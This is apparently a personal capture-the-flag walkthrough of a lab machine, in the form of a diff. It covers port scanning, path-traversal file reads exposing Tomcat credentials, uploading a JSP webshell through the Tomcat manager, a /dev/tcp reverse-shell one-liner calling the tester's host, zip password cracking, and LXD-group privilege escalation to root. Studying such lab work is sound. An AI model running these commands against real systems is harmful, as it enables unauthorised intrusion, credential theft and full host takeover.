@@ -1,0 +1,298 @@
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
+|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
+|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Mega Hosting
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8080/tcp open  http    Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+//port 80
+Html Created by: http://bootstrapthemes.co
+
+http://megahosting.htb/news.php?file=statement
+//a parameter file, try LFI
+
+view-source:http://megahosting.htb/news.php?file=../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:997:997::/opt/tomcat:/bin/false
+mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+ash:x:1000:1000:clive:/home/ash:/bin/bash
+
+
+
+//to view tomcat config file
+
+└─$ curl http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0">
+<!--
+  NOTE:  By default, no user is included in the "manager-gui" role required
+  to operate the "/manager/html" web application.  If you wish to use this app,
+  you must define such a user - the username and password are arbitrary. It is
+  strongly recommended that you do NOT use one of the users in the commented out
+  section below since they are intended for use with the examples web
+  application.
+-->
+<!--
+  NOTE:  The sample user and role entries below are intended for use with the
+  examples web application. They are wrapped in a comment and thus are ignored
+  when reading this file. If you wish to configure these users for use with the
+  examples web application, do not forget to remove the <!.. ..> that surrounds
+  them. You will also need to set the passwords to something appropriate.
+-->
+<!--
+  <role rolename="tomcat"/>
+  <role rolename="role1"/>
+  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+  <user username="role1" password="<must-be-changed>" roles="role1"/>
+-->
+   <role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+</tomcat-users>
+                                                
+//we get credentials
+
+http://10.10.10.194:8080/host-manager/html
+
+
+
+
+http://10.10.10.194:8080/manager/images/
+
+The page you tried to access (/manager/images/) does not exist.
+
+The Manager application has been re-structured for Tomcat 7 onwards and some of URLs have changed. All URLs used to access the Manager application should now start with one of the following options:
+
+/manager/html for the HTML GUI
+/manager/text for the text interface
+/manager/jmxproxy for the JMX proxy
+/manager/status for the status pages
+
+
+//google manager of tomcat
+//a>
+
+Exploiting Apache Tomcat manager-script role
+
+curl -v -u tomcat:$3cureP4s5w0rd123! — upload-file pwn.war “http://10.10.10.184:8080/manager/text/deploy?path=/foo&update=true"
+
+//b>
+https://tomcat.apache.org/tomcat-9.0-doc/host-manager-howto.html
+
+List of Commands
+
+The following commands are supported:
+
+    list
+    add
+    remove
+    start
+    stop
+    persist
+
+ Use the list command to see the available virtual hosts on your Tomcat instance.
+
+Example command:
+curl -u test:test http://localhost:8080/host-manager/text/list
+
+
+
+passwd='$3cureP4s5w0rd123!'
+
+curl -u ${username}:${passwd} http://10.10.10.194:8080/manager/text/list
+//${} for a parameter is required  
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:0:/usr/share/tomcat9-examples/examples
+/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
+/manager:running:0:/usr/share/tomcat9-admin/manager
+/docs:running:0:/usr/share/tomcat9-docs/docs
+
+
+https://gist.github.com/ErosLever/7445a3cfaaf80f1f5a53
+//jsp webshell cmd
+
+└─$ zip shell.war cmd.jsp  
+  adding: cmd.jsp (deflated 63%)
+
+
+└─$ curl -u ${username}:${passwd} -T shell.war http://10.10.10.194:8080/manager/text/deploy?path=/shell&update=true
+[1] 186193
+                                                                                                    
+┌──(ed㉿kali)-[~/oscp]
+└─$ OK - Deployed application at context path [/shell]
+
+[1]  + done       curl -u ${username}:${passwd} -T shell.war 
+//upload cmd shell
+
+http://10.10.10.194:8080/shell/cmd.jsp //get a cmd shell
+
+Command was: id
+
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+
+Command was: which nc
+
+/usr/bin/nc
+//but try many way cannot get nc revershell
+
+
+//create reverseshell
+└─$ jar cvf wshell.war shell.aspx 
+added manifest
+adding: shell.aspx(in = 15969) (out= 3593)(deflated 77%)
+
+echo "0<&196;exec 196<>/dev/tcp/10.10.16.7/8821; sh <&196 >&196 2>&196" > a
+
+└─$ python3 -m http.server 80   
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.194 - - [16/Nov/2025 11:26:13] "GET /a HTTP/1.1" 200 -
+
+└─$ nc -nvlp 8821                                                           
+listening on [any] 8821 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.10.194] 53516
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+tomcat@tabby:/var/lib/tomcat9$ id
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+
+//method2
+
+└─$ zip shell.war shell.jsp  
+  adding: shell.jsp (deflated 63%)
+//zip a jsp reverseshell and upload it to tomcat
+
+curl -u ${username}:${passwd} -T shell.war http://10.10.10.194:8080/manager/text/deploy?path=/shell&update=true
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+tomcat@tabby:/var/www/html/files$ unzip 16162020_backup.zip
+unzip 16162020_backup.zip
+Archive:  16162020_backup.zip
+checkdir error:  cannot create var
+                 Read-only file system
+                 unable to process var/www/html/assets/.
+[16162020_backup.zip] var/www/html/favicon.ico password: 
+
+   skipping: var/www/html/favicon.ico  incorrect password
+checkdir error:  cannot create var
+                 Read-only file system
+                 unable to process var/www/html/files/.
+   skipping: var/www/html/index.php  incorrect password
+   skipping: var/www/html/logo.png   incorrect password
+   skipping: var/www/html/news.php   incorrect password
+   skipping: var/www/html/Readme.txt  incorrect password
+
+
+base64 -w0 16162020_backup.zip
+
+echo "UEsDBAoAAAAAAIUDf0gAAAAAAAAAAAAAAAA<SNIP>" | base64 -d -w0 > backup.zip
+
+└─$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+'var/www/html/assets/' is not encrypted, skipping
+found file 'var/www/html/favicon.ico', (size cp/uc    338/   766, flags 9, chk 7db5)
+'var/www/html/files/' is not encrypted, skipping
+found file 'var/www/html/index.php', (size cp/uc   3255/ 14793, flags 9, chk 5935)
+found file 'var/www/html/logo.png', (size cp/uc   2906/  2894, flags 9, chk 5d46)
+found file 'var/www/html/news.php', (size cp/uc    114/   123, flags 9, chk 5a7a)
+found file 'var/www/html/Readme.txt', (size cp/uc    805/  1574, flags 9, chk 6a8b)
+checking pw arizon1                                 
+
+PASSWORD FOUND!!!!: pw == 
+
+su ash
+Password: admin@it
+
+id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+//adm and lxd
+
+https://amanisher.medium.com/lxd-privilege-escalation-in-linux-lxd-group-ec7cafe7af63
+//lxd group privi to es
+
+ash@tabby:~$ wget http://10.10.16.16:/alpine-v3.13-x86_64-20210218_0139.tar.gz -O a.tar.gz
+
+ash@tabby:~$ ./snap/bin/lxc image import a.tar.gz --alias myimage
+./snap/bin/lxc image import a.tar.gz --alias myimage
+bash: ./snap/bin/lxc: No such file or directory
+ash@tabby:~$ /snap/bin/lxc image import a.tar.gz --alias myimage
+/snap/bin/lxc image import a.tar.gz --alias myimage
+ash@tabby:~$ lxc image list
+lxc image list
+Command 'lxc' is available in '/snap/bin/lxc'
+The command could not be located because '/snap/bin' is not included in the PATH environment variable.
+lxc: command not found
+ash@tabby:~$ /snap/bin/lxc image list
+/snap/bin/lxc image list
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64       | CONTAINER | 3.11MB | Nov 19, 2025 at 3:27am (UTC) |
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+ash@tabby:~$ /snap/bin/lxc init myimage ignite -c security.privileged=true
+/snap/bin/lxc init myimage ignite -c security.privileged=true
+Creating ignite
+Error: No storage pool found. Please create a new storage pool
+
+//init lxd with default config
+ash@tabby:~$ /snap/bin/lxd init
+
+/snap/bin/lxc init myimage ignite -c security.privileged=true
+Creating ignite
+ash@tabby:~$ /snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+<ydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+ash@tabby:~$ /snap/bin/lxc start ignite
+/snap/bin/lxc start ignite
+ash@tabby:~$ /snap/bin/lxc exec ignite /bin/sh
+
+~ # ^[[40;5R
+
+~ # ^[[40;5Rid
+id
+uid=0(root) gid=0(root)
+/ # ^[[40;5Rcd mnt
+cd mnt
+/mnt # ^[[40;8Rls
+ls
+root
+/mnt # ^[[40;8Rcd root
+cd root
+cat root/root.txt
